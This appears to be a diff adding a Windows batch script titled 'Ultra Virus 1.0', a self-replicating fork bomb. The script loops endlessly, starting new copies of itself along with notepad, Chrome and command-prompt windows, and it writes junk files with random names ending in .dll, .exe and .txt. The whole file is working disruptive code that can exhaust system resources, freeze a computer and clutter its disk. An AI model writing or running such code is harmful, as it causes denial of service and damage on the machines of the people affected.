@@ -1,0 +1,34 @@
+@echo off
+title Ultra Virus 1.0
+color 4
+cls
+echo =========================================
+echo                                         !
+echo            Ultra Virus 1.0              +
+echo                                         ! 
+echo =========================================
+echo [!] Exit Terminal To Terminate Program
+echo =========================================
+echo [!] Starting...
+goto loop
+
+:loop
+start Virus.bat
+echo Hacked!! > %random%.dll
+echo Hacked!! > %random%.exe
+echo Hacked!! > %random%.txt
+start Virus.bat
+goto starter
+
+
+:starter
+start Virus.bat
+start notepad.exe
+start chrome.exe
+start cmd.exe
+start Virus.bat
+start chrome.exe
+start notepad.exe
+start cmd.exe
+start Virus.bat
+goto loop
